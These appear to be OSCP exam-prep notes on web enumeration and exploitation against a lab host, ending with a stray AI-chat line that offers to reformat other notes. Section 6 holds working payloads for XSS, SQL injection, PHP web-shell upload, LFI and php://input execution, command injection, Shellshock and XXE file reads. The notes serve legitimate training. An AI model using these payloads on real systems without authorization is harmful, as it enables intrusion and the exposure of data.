# Web Application Enumeration & Exploitation Notes (OSCP-Ready)

> Use this when a target exposes HTTP(S). One-liners auto-create output folders under `scans/<TARGET>` so you keep evidence organized for the report.

- **Covers**: Module 8 web methodology & tools (Nmap, Wappalyzer, Gobuster, Burp), enumeration (headers, cookies, source, APIs), and core attacks (**XSS**, **SQLi**, **LFI/RFI**, **File-upload**, **SSTI**, **XXE**, **Cmd-inj**), with **post-exploitation evidence** habits.  
- **Why this format**: candidates pass more reliably with **one organized notes repo** vs scattered PDFs/Notion.  
- **HTB web labs**: practice flow aligns with typical HTB web boxes (**manual**, **no metasploit**).

---

## 0) Quickstart (create workspace once)

```bash
# change 10.10.10.5 as needed per host
mkdir -p scans/10.10.10.5/http scans/10.10.10.5/notes
````

> **Mistake → Fix** — **Messy evidence & missing screenshots/logs** → Always log output into `scans/<host>/...` as you go; it saves hours when writing the report.

---

## 1) Fingerprint the Web Stack

### 1.1 Nmap service & quick fingerprint (port 80/443)

```bash
mkdir -p scans/10.10.10.5/http && \
nmap -p80,443 -sV --script=http-enum -oA scans/10.10.10.5/http/nmap_http 10.10.10.5
```

> **Mistake → Fix** — **Only relying on one scan** → run targeted scripts after initial `-sV`; **verify results manually** to avoid false positives.

### 1.2 Tech stack (whatweb) + headers

```bash
whatweb http://10.10.10.5 | tee scans/10.10.10.5/http/whatweb.txt
curl -i -s http://10.10.10.5 | tee scans/10.10.10.5/http/headers_http.txt
```

### 1.3 Wappalyzer (GUI/extension)

* Use the browser extension to confirm libraries & versions (jQuery, React, backend).
* *(If browser isn’t available, rely on `whatweb` + static file hints.)*

---

## 2) Content Discovery (dirs/files, sitemaps, robots)

### 2.1 Gobuster directory brute force (gentle threads)

```bash
gobuster dir -u http://10.10.10.5 \
  -w /usr/share/wordlists/dirb/common.txt -t 10 \
  -o scans/10.10.10.5/http/gobuster_common.txt
```

> **Mistake → Fix** — **Only fuzzing “/” and missing vhosts/alt ports/backups** → include the **Relative Web Paths** list below and test vhosts when any domain is known.

### 2.2 Robots & sitemaps

```bash
curl -s http://10.10.10.5/robots.txt  | tee scans/10.10.10.5/http/robots.txt
curl -s http://10.10.10.5/sitemap.xml | tee scans/10.10.10.5/http/sitemap.xml
```

---

## 3) Curated Relative Web Paths (OSCP quick wins)

| Path                         | Likely contents                            | Quick tell                          |
| ---------------------------- | ------------------------------------------ | ----------------------------------- |
| `/dev/`                      | test tools, `phpbash.php`, debug endpoints | Gobuster hits with “dev/test” names |
| `/uploads/`                  | user uploads; **sometimes executable**     | upload feature present; weak MIME   |
| `/backup/`, `/backups/`      | `.zip`, `.tar`, `.sql`, `.bak`, old config | brute shows backups/old files       |
| `/admin/`, `/administrator/` | admin UIs, default creds                   | matches stack (e.g., `/wp-admin`)   |
| `/config/`, `/configs/`      | YAML/INI/PHP configs with creds            | curl & **grep `pass\|user\|key`**   |
| `/old/`, `/tmp/`, `/test/`   | legacy / scratch code                      | directory listing enabled           |
| `/.git/`, `/.svn/`           | repo histories / leaks                     | try `/.git/HEAD`, consider dump     |
| `/api/`, `/v1/`              | JSON APIs                                  | `curl` returns `{...}` bodies       |

---

## 4) Web Proxying & Manual Testing (Burp Suite CE)

1. Launch Burp (Kali menu or `burpsuite`), set **Proxy 127.0.0.1:8080**; in Firefox set the same.
2. Use **Proxy → HTTP history**, **Repeater**, and (light) **Intruder** to modify & replay requests.

> **Mistake → Fix** — **Leaving Intercept ON and browser hangs** → **Disable Intercept** except when you need to modify a request.

---

## 5) API Enumeration (black-box)

### 5.1 Pattern brute-force for `/api/<name>/v1`

```bash
cat > scans/10.10.10.5/http/api.pattern << 'EOF'
{GOBUSTER}/v1
{GOBUSTER}/v2
EOF

gobuster dir -u http://10.10.10.5:5001 \
  -w /usr/share/wordlists/dirb/big.txt \
  -p scans/10.10.10.5/http/api.pattern \
  -o scans/10.10.10.5/http/gobuster_api.txt
```

### 5.2 Probe endpoints with curl (JSON)

```bash
curl -i http://10.10.10.5:5001/users/v1 | tee scans/10.10.10.5/http/api_users_v1.txt
```

> **Mistake → Fix** — **GET returns 405 Method Not Allowed** → retry with **`-X POST`** or **`-X PUT`** (405 = endpoint exists, wrong verb).

---

## 6) Common Attack Checks (manual first)

### 6.1 XSS (stored/reflected)

```bash
curl -G --data-urlencode 'q=<script>alert(1)</script>' http://10.10.10.5/search
curl -i -s http://10.10.10.5/ -H "User-Agent: <script>alert(42)</script>"
```

### 6.2 SQL Injection

```bash
curl "http://10.10.10.5/item.php?id=1 UNION SELECT 1,2,3-- "
curl "http://10.10.10.5/item.php?id=1' AND '1'='1-- "
curl "http://10.10.10.5/item.php?id=1 AND SLEEP(5)-- "
```

### 6.3 File Upload

```bash
curl -F "file=@shell.php.jpg" http://10.10.10.5/upload

printf "GIF89a;\n<?php system('id'); ?>" > shell.php.gif
curl -F "file=@shell.php.gif" http://10.10.10.5/upload
```

### 6.4 LFI / RFI

```bash
curl "http://10.10.10.5/index.php?page=../../../../etc/passwd"
curl "http://10.10.10.5/index.php?page=php://filter/convert.base64-encode/resource=index.php"
curl -X POST "http://10.10.10.5/index.php?page=php://input" -d "<?php system('id'); ?>"
```

### 6.5 Command Injection

```bash
curl "http://10.10.10.5/ping.php?host=127.0.0.1;id"

curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" http://10.10.10.5/cgi-bin/status
```

### 6.6 SSTI

```bash
curl "http://10.10.10.5/page?name={{7*7}}"
```

### 6.7 XXE

Save as `scans/10.10.10.5/http/xxe.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

Send:

```bash
curl -H 'Content-Type: application/xml' \
     --data-binary @scans/10.10.10.5/http/xxe.xml \
     http://10.10.10.5/upload-xml
```

---

## 7) Browser Developer Tools

* **Inspector / Debugger**: pretty-print JS, find hidden inputs, comments.
* **Network**: view headers (`Server`, `X-Powered-By`, CSP), redirects (301/302).

---

## 8) Evidence & Reporting Habits

```bash
script -f scans/10.10.10.5/term.log
exit
```

* Screenshot every: `whoami`, `hostname`, `ip`, and **flag proofs**.

---

## 9) Post-Foothold Checklist

```bash
# Windows
whoami /all & systeminfo & ipconfig /all & route print & arp -a & tasklist > post_enum_windows.txt

# Linux
( whoami; id; uname -a; cat /etc/os-release; ip -a || ifconfig -a; \
  ip r || route -n; ss -tulpn || netstat -tulpn ) > post_enum_linux.txt
```

---

## 10) One-Command Web Kickoff

```bash
TARGET=10.10.10.5; mkdir -p scans/$TARGET/http && \
whatweb http://$TARGET | tee scans/$TARGET/http/whatweb.txt && \
curl -i -s http://$TARGET | tee scans/$TARGET/http/headers_http.txt && \
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt -t 10 \
  -o scans/$TARGET/http/gobuster_common.txt && \
curl -s http://$TARGET/robots.txt | tee scans/$TARGET/http/robots.txt
```

---

## References

* PEN-200 Modules (esp. 8: Web Methodology, Tools, Enumeration, XSS)
* Service Enumeration Cards (HTTP paths & mini-playbooks)
* OSCP Fail Patterns (notes hygiene, timeboxing, screenshots discipline)

```

---

All commands are now **grey code blocks**.  
👉 Do you want me to apply this exact formatting style across your **AD notes + Service Enum notes** too, so the whole repo is visually consistent?
```
